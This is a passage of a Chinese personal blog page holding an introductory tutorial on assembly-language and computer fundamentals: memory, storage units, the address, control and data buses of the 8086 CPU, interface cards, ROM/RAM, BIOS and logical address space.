<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="静态个人博客">
<meta name="description" content="记录一些学习工作中的知识点！">
<meta name="theme-color" content="#000">
<title>【汇编】计算机底层 | STAy&#39;s Blog</title>
<link rel="shortcut icon" href="/favicon.ico?v=1684375199109">
<link rel="stylesheet" href="/media/css/pisces.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">

<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>





  <meta name="description" content="【汇编】计算机底层" />
  <meta name="keywords" content="" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="pisces">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>STAy&#39;s Blog</span>
            </a>  
          
        </div>
        
          <p class="subtitle">落叶的一生，只为了归根么？</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> 首页
                </a>
              
            </li>
          
            
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> 归档
                </a>
              
            </li>
          
            
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> 标签
                </a>
              
            </li>
          
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout pisces ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
      <div class="sidebar-body pisces" id="sidebar_body">
        
          
            <div style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number no_compress"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li>
<ul>
<li>
<ul>
<li><a href="#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%9A%84%E7%BB%84%E6%88%90"><strong>汇编语言的组成</strong></a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AD%98%E5%82%A8%E5%99%A8"><strong>什么是存储器？</strong></a>
<ul>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98"><strong>什么是内存？</strong></a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%8C%87%E4%BB%A4%E5%92%8C%E6%95%B0%E6%8D%AE"><strong>什么是指令和数据？</strong></a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AD%98%E5%82%A8%E5%8D%95%E5%85%83"><strong>什么是存储单元？</strong></a></li>
<li><a href="#cpu%E5%AF%B9%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C"><strong>CPU对存储器的读写操作</strong></a></li>
</ul>
</li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%BB%E6%9D%BF"><strong>什么是主板？</strong></a>
<ul>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A5%E5%8F%A3%E5%8D%A1"><strong>什么是接口卡？</strong></a></li>
<li><a href="#%E5%AD%98%E5%82%A8%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BBrom-ram"><strong>存储器的分类（ROM / RAM）</strong></a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFbios"><strong>什么是BIOS？</strong></a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%80%BB%E8%BE%91%E5%AD%98%E5%82%A8%E5%99%A8%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><strong>什么是逻辑存储器（内存地址空间）？</strong></a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // 保存li元素
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // 处理不是从#一级标题开始目录
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    window.Velocity(hideElement, 'stop');
    window.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        window.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://cactusii.github.io/post/hui-bian-01-ji-suan-ji-di-ceng-ji-chu/">
      【汇编】计算机底层
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">发布于</span>
      <span class="publish-time" data-t="2021-09-03 20:07:39">2021-09-03</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>12<span class="language" data-lan="minute">分钟</span></span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>3295<span class="pc-show language" data-lan="words">字数</span></span>
    </span>
    
  </div>
</section>
            <div class="post-body next-md-body" id="post_body">
              <h3 id="汇编语言的组成"><strong>汇编语言的组成</strong></h3>
<p>汇编语言由以下3类指令组成：<br>
1）汇编指令（与机器指令一一对应，它是机器码的助记符）<br>
2）伪指令（由编译器识别并执行）<br>
3）其它符号（由编译器识别并执行）<br>
汇编语言的核心是汇编指令，汇编指令决定了汇编程序的特性。</p>
<h3 id="什么是存储器"><strong>什么是存储器？</strong></h3>
<p>CPU是计算机的核心部件，它控制着整个计算机的运作并进行系统运算，要想让CPU工作，就必须向它提供机器指令和数据，指令是告诉CPU怎么做，数据是CPU执行任务的原材料。这些机器指令和数据是存放在存储器中的。计算机中大多数的硬件都有存储器，除了CPU外，显卡、BIOS等也都有自己独立的存储器。<br>
存储器的存储容量单位是字节（Byte，一个字节有8位 bit，即2的8次方），1KB=1024Byte，1MB=1024KB，1GB=1024MB，1TB=1024GB。<br>
磁盘的容量单位和存储器的容量单位是一样的。Byte单位是微机中最最常用的计量单位。</p>
<h4 id="什么是内存"><strong>什么是内存？</strong></h4>
<p>内存是计算机结构中最主要的一个存储器，仅此而已。存储器不等于内存，比如显卡中的显存也属于存储器，所以存储器包括了内存、显存等多种类型的存储器。在一台PC机中，内存的作用仅次于CPU。离开了内存，性能再好的CPU也无法工作。磁盘不同于内存，磁盘中的数据或程序如果不讲到内存中去，它就无法被CPU使用。所以，学习汇编语言基本上就是在学习CPU如何调用并使用内存中的数据。</p>
<h4 id="什么是指令和数据"><strong>什么是指令和数据？</strong></h4>
<p>指令和数据是应用上的概念，同一串二进制代码，可以是指令，也可以是数据，这决定于我们的程序设计。如下示例：</p>
<pre><code class="language-undefined">1000100111011000
</code></pre>
<p>当被应用为数据时，它等于 89D8H，H 表示是十六进制。当被应用为指令时，它指的是 MOV  AX, BX。<br>
<strong>不难看出，同一串二进制代码，应用不同，既可以作为指令使用，也可以作为数据来使用。</strong></p>
<h4 id="什么是存储单元"><strong>什么是存储单元？</strong></h4>
<p>存储器被划分为若干个存储单元，每个存储单元都从0开始顺序编号。比如一个存储器有128个存储单元，则它的编号范围是 0~127。</p>
<h4 id="cpu对存储器的读写操作"><strong>CPU对存储器的读写操作</strong></h4>
<p>CPU要想实现数据的读写操作，就必须与外部器件（芯片）进行以下三类信息的交互：<br>
1）地址信息，即存储单元的地址<br>
2）控制信息，即对存储器的存储器件（芯片）的选择——读或写<br>
3）数据信息，即将要用于读或写的数据</p>
<p><strong>那么CPU是通过什么将地址信息、控制信息和数据信息传递到存储器芯片中的呢？</strong><br>
我们知道，电子计算机能处理和传输的信息都是电信号，电信号是使用导线来传送的，所以CPU也是通常导线把地址信息、控制信息和数据信息传递至存储器的存储芯片中去的。在计算机中，专门有连接CPU和其它存储器芯片的导线，这些导线通常被称为总线。总线在物理上即一根根导线的集合，在逻辑上可以被划分为地址总线、控制总线和数据总线（这与上述CPU交互的三类信息相对应）。这里特别说明，存储器包括了内存、显存、网卡中的存储器等多种类型的存储器。</p>
<figure data-type="image" tabindex="1"><img src="https:////upload-images.jianshu.io/upload_images/2463290-36799d4b31a55cd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/503/format/webp" alt="img" loading="lazy"></figure>
<p>读写过程基本如下：首先CPU通过地址总线把地址信息传递至存储器，对应地找到目标存储单元；CPU又通过控制总线把控制信息（读操作或写操作）传递至存储器，找到对应读或写的芯片器件；CPU最后通过数据总线把将要被读或被写的数据信息传递至目标存储单元，执行数据的读或写。</p>
<p><strong>关于8086CPU</strong><br>
8086CPU是一款经典的CPU，它的数据总线宽度是 16位。无论当下CPU更新速度多么快，它们都与8086CPU的技术架构是一致的，变化的只是晶体管的数量多了，导线的数量多了而已。学好了8086CPU的工作原理，基本上就能举一反三地学习其它更高级的CPU了。</p>
<p><strong>地址总线</strong><br>
CPU是通过地址总线来寻找和指定存储单元的，地址总线上能传输多少个不同的地址信息，那么CPU就可以对多少个存储单元进行寻址。如果一个CPU有 N 根地址总线，则可以说这个CPU的地址总线宽度即为N，那么这个CPU最多可以寻找到 2 的N次方个存储单元。地址总线的宽度，决定了CPU的寻址能力。</p>
<figure data-type="image" tabindex="2"><img src="https:////upload-images.jianshu.io/upload_images/2463290-009f99bf880ea100.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/279/format/webp" alt="img" loading="lazy"></figure>
<p><strong>控制总线</strong><br>
CPU对外部器件的控制是通过控制总线来实现的。控制总线是一些不同类型的控制线的集合。理论上讲，有多少根控制总线，就意味着CPU能提供对外器件的多少种控制。这里所说的控制，无非就是读和写两种，对一根控制线来讲，发送0表示读（低电平），发送1表示写（高电平）。有多少根控制线，就能控制多少个外部器件。控制总线的宽度，决定了CPU对外部器件的控制能力。</p>
<figure data-type="image" tabindex="3"><img src="https:////upload-images.jianshu.io/upload_images/2463290-61ead89d2ff94a43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/355/format/webp" alt="img" loading="lazy"></figure>
<p><strong>数据总线</strong><br>
CPU与存储器之间的数据信息传输是通过数据总线来完成的。数据总线的宽度决定了CPU和外界的数据传输速度。可以把数据总线类比成高速公路，路面上的车道数越多，则通车的速度就更快。举例说明，8088CPU的数据总线宽度是8位（即有8根数据总线），如果它要把 8D99H 这个数据传递至存储器，则需要传递两次，先把低位 99 传递过去，再把高位的 8D 传递过去；如果是 8086CPU，则只需要一次传递即可把 8D99H 传递至存储器，因为 8086CPU 的数据总线宽度是 16 位（即有16根数据总线）的。数据总线的宽度，是决定CPU运算速度的因素之一（当今的CPU之所以工作速度越来越快，这不仅仅与数据总线宽度越来越宽有关，还与寄存器、二级缓存数量的增加有关，还与“打孔-&gt;计电器-&gt;电子管-&gt;晶体管”的技术发展有关）。</p>
<figure data-type="image" tabindex="4"><img src="https:////upload-images.jianshu.io/upload_images/2463290-cd77d56712384e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/440/format/webp" alt="img" loading="lazy"></figure>
<h3 id="什么是主板"><strong>什么是主板？</strong></h3>
<p>在每台PC机中，都有一块主板，主板上有着电脑所必须的核心器件和一些主要器件，这些器件通过总线（地址总线、数据总线、控制总线）相互连接在一起。</p>
<h4 id="什么是接口卡"><strong>什么是接口卡？</strong></h4>
<p>在计算机系统中，所有可用程序控制其工作的设备，都必须受到CPU的控制。但是CPU又不能直接对外部设备进行控制。事实上，直接控制这些外部设备的硬件就是接口卡，这些接口卡是插在扩展插槽上的。这些外部设备如显示器、音箱、打印机等。CPU通过总线控制这些接口卡，从而间接地控制着这些外部设备。但凡没有连接到接口卡的外部设备，都无法被CPU控制。<br>
显卡、网卡、声卡等等，都是接口卡。CPU控制显卡，显卡再控制显示器的显示。CPU控制网卡，网卡再与外部的网线进行通信交流。</p>
<h4 id="存储器的分类rom-ram"><strong>存储器的分类（ROM / RAM）</strong></h4>
<p>从读写属性上划分，可以分为随机存储器（RAM）和只读存储器（ROM）。随机存储器中的数据可读可写，当电脑断电时数据会丢失，比如内存；只读存储器只能读数据，不能写入数据，电脑断电后数据不会丢失，这些数据是硬件设计者预先写入的，比如BIOS的ROM。<br>
从功能和连接类型上划分，可以分为常用RAM，接口卡的RAM，接口卡上的ROM。</p>
<figure data-type="image" tabindex="5"><img src="https:////upload-images.jianshu.io/upload_images/2463290-6e5fd571dd44977a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/604/format/webp" alt="img" loading="lazy"></figure>
<p>上图中，显卡上的ROM是为电脑开机显示器显示时所需要的基本输入输出数据，显卡上的RAM可以动态地写入数据并显示在显示器上。</p>
<h4 id="什么是bios"><strong>什么是BIOS？</strong></h4>
<p>BIOS即Basic Input/Output System，基本输入输出系统。BIOS是由主板和各类接口卡（网卡、显示等）厂商提供的软件系统，通过BIOS可以利用硬件设备实现最基本的输入输出。不仅是主板有BIOS，一些接口卡上也有BIOS。BIOS中的ROM就是只读存储器，专为相应硬件提供最基本的输入输出。</p>
<h4 id="什么是逻辑存储器内存地址空间"><strong>什么是逻辑存储器（内存地址空间）？</strong></h4>
<p>对CPU来讲，系统中所有物理存储器中的存储单元都处在一个统一的逻辑存储器中，这个逻辑存储器的容量大小受到CPU寻址能力的限制。如果一个CPU的地址总线宽度为10 ，则该CPU可以寻址的存储单元为1024个，这1024个可寻到的存储单元就构成了这个CPU的<strong>内存地址空间</strong>，也叫做<strong>逻辑存储器</strong>。</p>
<figure data-type="image" tabindex="6"><img src="https:////upload-images.jianshu.io/upload_images/2463290-a3b0dfddd83c325b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/592/format/webp" alt="img" loading="lazy"></figure>
<p>从CPU的视角来看，它将各类物理存储器看作是一个逻辑存储器。所有的物理存储器都被看作是一个由若干存储单元组成的逻辑存储器；每个物理存储器在这个逻辑存储中都会占有一个地址段，即一段地址空间；CPU在这段地址空间中进行数据读写，实际上就是在其相对应的物理存储器中进行数据读写。</p>
<p>计算机系统结构中的各个物理存储器，在物理上是独立存在的器件，它们都和CPU的总线相连。CPU对它们进行读或写，是通过控制总线发出读写命令的。</p>
<p>对CPU来讲，它看到的只是这个逻辑存储器。逻辑存储器中地址段是由各个物理存储器报上来的。举例说明，比如某个CPU的逻辑存储器地址段分配如下，地址0~7FFFH 这32KB空间是主RAM，地址8000H9FFFH这8KB空间是显存RAM，地址A000HFFFFH这24KB空间是其它器件ROM。</p>
<p>不同的计算机系统，其内存地址空间的分配情况也是不尽相同的。比如8086CPU的PC机，其逻辑存储器的地址空间分配如下图示：</p>
<figure data-type="image" tabindex="7"><img src="https:////upload-images.jianshu.io/upload_images/2463290-25624f7c20c0ea93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/496/format/webp" alt="img" loading="lazy"></figure>
<p>最终运行程序的器件是CPU。我们用汇编语言编程的时候，必须要从CPU的角度去考虑问题。即使是用高级编程语言去编写程序，经过编译后还是会变成汇编程序，再由汇编程序转译成机器码，进一步交给CPU去执行。因此，<strong>学会从CPU的角度去思考问题并编程，是我们学习汇编语言的核心目的</strong>。</p>
<p><strong>本章小结</strong><br>
1）汇编指令是机器指令的助记符，它们是一一对应的关系。基于这种一一对应的关系，汇编程序通过编译可以转译成机器指令程序；.exe程序通过反编译可以将其转化成汇编程序。<br>
2）每种型号的CPU，都有自己特有的汇编指令集。<br>
3）CPU能够直接使用的信息都存放在存储中，并且CPU有且只能直接使用存储器中的数据。<br>
4）在存储器中，指令和数据是没有任何区别的，它们都是二进制信息。唯一区分它们的方式就是，这些信息是通过哪种类型的总线来传输的，使用地址总线传输的信息是地址信息，使用数据总线传输的信息是数据信息，使用控制总线传输的信息是控制信息。<br>
5）存储器中的存储单元都是从0开始顺序编号的。<br>
6）一个存储单元可以存储8位bit，所以一个存储单元的存储容量即为一个字节 Byte（2的8次方），1Byte = 8bit。<br>
7）CPU芯片有很多管脚，这些管脚分别和每一条总线相连接。正是这些管理，从CPU端引出了三种类型的总线，总线的数量（宽度）标志着CPU各个方面的性能。其中地址总线的宽度决定了CPU的寻址能力；数据总线的宽度决定着CPU与其它器件交换数据时的单次数据传送量；控制总线决定了CPU对系统中其它器件的控制能力。</p>

            </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">本文作者：</strong>
      STAy
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">本文链接：</strong>
      <a href="https://cactusii.github.io/post/hui-bian-01-ji-suan-ji-di-ceng-ji-chu/" title="【汇编】计算机底层">https://cactusii.github.io/post/hui-bian-01-ji-suan-ji-di-ceng-ji-chu/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">版权声明： </strong>
      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
    </li>
  </ul>
  <div class="tags">
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="【linux】内存管理" href="https://cactusii.github.io/post/linux-04-nei-cun-guan-li/">【linux】内存管理</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="【linux】内存管理" href="https://cactusii.github.io/post/linux-04-nei-cun-guan-li/">上一篇</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="【linux】字符设备驱动" href="https://cactusii.github.io/post/linux-02-jian-dan-de-zi-fu-she-bei-qu-dong/">【linux】字符设备驱动</a>
        <a class="nav-mobile-next" title="【linux】字符设备驱动" href="https://cactusii.github.io/post/linux-02-jian-dan-de-zi-fu-she-bei-qu-dong/">下一篇</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  <script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
<div id="vcomments" style="padding: 10px 0px 0px 0px"></div>

<style>
  .v .veditor {
    min-height: 10rem;
    background-image: url('');
    background-size: contain;
    background-repeat: no-repeat;
    background-position: right;
    background-color: rgba(255, 255, 255, 0);
    resize: none;
  }

  .v .vwrap {
    border: 1px solid #000 !important;
  }

  .v .vbtn {
    padding: .4rem 1.2rem !important;
    border-color: #fff !important;
    background-color: #49b1f5 !important;
    color: #fff !important;
    font-size: .7rem !important;
  }

  .v .vcards .vcard .vh .vmeta .vat {
    padding: 0 .8rem !important;
    border: 1px solid #00c4b6 !important;
    border-radius: 5px !important;
    color: #00c4b6 !important;
  }
</style>
<script>
  new Valine({
    el: '#vcomments',
    appId: '',
    appKey: '',
    avatar: '',
    placeholder: '',
    pageSize: '',
    lang: 'zh-cn',
    enableQQ: 'true' === 'false',
    visitor: 'true' === 'false',
    highlight: 'true' === 'true',
    avatarForce: 'true' === 'false',
  });
</script>

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a
        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      
    </div>
  </footer>
  
  
  <div class="pisces back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
    back2TopText = document.querySelector('#back_to_top_text'),
    drawerBox = document.querySelector('#drawer_box'),
    rightSideBar = document.querySelector('.sidebar'),
    viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener('scroll', function (e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });


  let hasCacu = false;
  window.onresize = function () {
    calcuHeight();
  }

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS
      };
      closeProp = {
